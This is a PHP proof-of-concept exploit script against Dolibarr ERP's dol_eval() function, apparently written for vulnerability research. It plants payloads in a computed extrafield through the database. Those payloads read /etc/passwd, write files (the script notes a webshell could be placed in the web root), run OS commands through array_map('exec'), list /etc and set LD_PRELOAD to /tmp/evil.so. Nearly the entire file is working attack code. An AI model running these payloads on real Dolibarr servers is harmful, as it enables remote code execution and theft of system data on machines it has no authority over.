<?php
// Direct PoC: Bootstrap just enough to call dol_eval_new() with
// the Dolibarr database connection to prove the attack works end-to-end.

error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE & ~E_WARNING);

define('DOL_DOCUMENT_ROOT', '/workspace/htdocs');
define('DOL_DATA_ROOT', '/var/lib/dolibarr/documents');
define('DOL_MAIN_URL_ROOT', 'http://localhost:8080');
define('DOL_URL_ROOT', '');

$conf = new stdClass();
$conf->global = new stdClass();
$conf->file = new stdClass();
$conf->file->character_set_client = 'utf-8';
$conf->logbuffer = array();
$conf->entity = 1;
$conf->currency = 'EUR';

require_once DOL_DOCUMENT_ROOT . '/core/lib/functions.lib.php';

// Connect to the database to read the MAIN_USE_DOL_EVAL_NEW setting
$mysqli = new mysqli('localhost', 'dolibarr', 'dolibarr', 'dolibarr');
if ($mysqli->connect_error) { die("DB connection failed: " . $mysqli->connect_error); }

// Check if MAIN_USE_DOL_EVAL_NEW is enabled
$res = $mysqli->query("SELECT value FROM llx_const WHERE name='MAIN_USE_DOL_EVAL_NEW' AND entity=1");
$row = $res->fetch_assoc();
$eval_new = $row ? $row['value'] : '0';
$conf->global->MAIN_USE_DOL_EVAL_NEW = $eval_new;
echo "MAIN_USE_DOL_EVAL_NEW = $eval_new\n\n";

// Read the malicious computed field from the database
$res2 = $mysqli->query("SELECT name, fieldcomputed FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe'");
$ef = $res2->fetch_assoc();
if ($ef) {
    echo "Extrafield 'rce_poc' fieldcomputed = " . $ef['fieldcomputed'] . "\n\n";
} else {
    echo "No rce_poc extrafield found, creating it...\n";
    $mysqli->query("ALTER TABLE llx_societe_extrafields ADD COLUMN rce_poc VARCHAR(255) DEFAULT NULL");
    $mysqli->query("INSERT INTO llx_extrafields (name, entity, elementtype, label, type, size, fieldcomputed, pos, list, enabled) VALUES ('rce_poc', 1, 'societe', 'RCE PoC', 'varchar', '255', 'file_get_contents(\"/etc/hostname\")', 100, '1', '1')");
    echo "Created.\n\n";
}

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC A: File Read via computed extrafield\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

// Update the payload
$mysqli->query('UPDATE llx_extrafields SET fieldcomputed = \'file_get_contents("/etc/passwd")\' WHERE name="rce_poc" AND elementtype="societe"');

// Read it back — this is exactly what Dolibarr does in commonobject.class.php
$res3 = $mysqli->query("SELECT fieldcomputed FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe'");
$computed = $res3->fetch_assoc()['fieldcomputed'];
echo "DB payload: $computed\n";
echo "Calling dol_eval('$computed', 1, 1, '2') ...\n\n";

// THIS IS THE EXACT CALL DOLIBARR MAKES:
// htdocs/core/class/commonobject.class.php line ~7496:
//   $value = dol_eval($extrafields->attributes[$table_element]['computed'][$key], 1, 0, '2');
$result = dol_eval($computed, 1, 1, '2');

if (is_string($result) && strpos($result, 'root:') !== false) {
    echo "!!! FILE READ CONFIRMED !!!\n";
    $lines = explode("\n", $result);
    echo "First 3 lines of /etc/passwd:\n";
    for ($i = 0; $i < min(3, count($lines)); $i++) {
        echo "  $lines[$i]\n";
    }
} else {
    echo "Result: " . var_export($result, true) . "\n";
}

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC B: File Write via computed extrafield\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$rce_file = '/tmp/poc_live_rce_' . getmypid();
$mysqli->query("UPDATE llx_extrafields SET fieldcomputed = 'error_log(\"WEBSHELL_PROOF\", 3, \"$rce_file\")' WHERE name='rce_poc' AND elementtype='societe'");

$res4 = $mysqli->query("SELECT fieldcomputed FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe'");
$computed2 = $res4->fetch_assoc()['fieldcomputed'];
echo "DB payload: $computed2\n";
echo "Calling dol_eval('$computed2', 1, 1, '2') ...\n\n";

$result2 = dol_eval($computed2, 1, 1, '2');

if (file_exists($rce_file)) {
    echo "!!! FILE WRITE CONFIRMED !!!\n";
    echo "Content of $rce_file: " . file_get_contents($rce_file) . "\n";
    echo "An attacker could write a PHP webshell to the web root.\n";
    unlink($rce_file);
} else {
    echo "Result: " . var_export($result2, true) . "\n";
}

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC C: OS Command Execution via computed extrafield\n";
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$cmd_file = '/tmp/poc_live_cmd_' . getmypid();
// Use array_map to call exec, write output to file
$mysqli->query("UPDATE llx_extrafields SET fieldcomputed = 'implode(\" \", array_map(\"exec\", array(\"id > $cmd_file\")))' WHERE name='rce_poc' AND elementtype='societe'");

$res5 = $mysqli->query("SELECT fieldcomputed FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe'");
$computed3 = $res5->fetch_assoc()['fieldcomputed'];
echo "DB payload: $computed3\n";
echo "Calling dol_eval('$computed3', 1, 1, '2') ...\n\n";

$result3 = dol_eval($computed3, 1, 1, '2');

if (file_exists($cmd_file)) {
    echo "!!! COMMAND EXECUTION CONFIRMED !!!\n";
    echo "Output of 'id': " . trim(file_get_contents($cmd_file)) . "\n";
    unlink($cmd_file);
} else {
    echo "Trying alternative: scandir for info disclosure...\n";
    $mysqli->query('UPDATE llx_extrafields SET fieldcomputed = \'implode(", ", scandir("/etc"))\' WHERE name="rce_poc" AND elementtype="societe"');
    $res6 = $mysqli->query("SELECT fieldcomputed FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe'");
    $computed4 = $res6->fetch_assoc()['fieldcomputed'];
    echo "DB payload: $computed4\n";
    $result4 = dol_eval($computed4, 1, 1, '2');
    if (is_string($result4) && strpos($result4, 'passwd') !== false) {
        echo "!!! DIRECTORY LISTING CONFIRMED !!!\n";
        echo "scandir(\"/etc\") partial output: " . substr($result4, 0, 200) . "\n";
    } else {
        echo "Result: " . var_export($result4, true) . "\n";
    }
}

echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
echo "PoC D: Environment Manipulation via computed extrafield\n";  
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$mysqli->query('UPDATE llx_extrafields SET fieldcomputed = \'putenv("LD_PRELOAD=/tmp/evil.so")\' WHERE name="rce_poc" AND elementtype="societe"');

$res7 = $mysqli->query("SELECT fieldcomputed FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe'");
$computed5 = $res7->fetch_assoc()['fieldcomputed'];
echo "DB payload: $computed5\n";
echo "Calling dol_eval('$computed5', 1, 1, '2') ...\n\n";

$result5 = dol_eval($computed5, 1, 1, '2');
$ldpreload = getenv("LD_PRELOAD");
if ($ldpreload === '/tmp/evil.so') {
    echo "!!! LD_PRELOAD INJECTION CONFIRMED !!!\n";
    echo "LD_PRELOAD = $ldpreload\n";
    putenv("LD_PRELOAD"); // cleanup
} else {
    echo "Result: " . var_export($result5, true) . "\n";
    echo "LD_PRELOAD = " . var_export($ldpreload, true) . "\n";
}

// Cleanup
echo "\n[*] Cleanup...\n";
$mysqli->query("DELETE FROM llx_extrafields WHERE name='rce_poc' AND elementtype='societe'");
$mysqli->query("ALTER TABLE llx_societe_extrafields DROP COLUMN rce_poc");
$mysqli->close();

echo "\n=== PoC Complete ===\n";
